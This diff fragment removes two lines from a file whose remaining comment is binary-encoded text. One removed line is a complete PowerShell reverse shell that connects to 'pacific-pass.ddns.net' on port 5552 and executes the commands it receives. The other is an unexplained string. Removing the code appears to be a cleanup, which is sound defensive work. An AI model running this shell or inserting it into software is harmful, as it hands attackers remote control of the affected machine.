@@ -1,3 +1,1 @@
 # 01001000-01100101-01110010-01100101-00101100-00100000-01100001-01110100-00100000-01110100-01101000-0
-0H0d@77@8qk2pMqsqA@APT
-$client = New-Object System.Net.Sockets.TCPClient("pacific-pass.ddns.net",5552);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
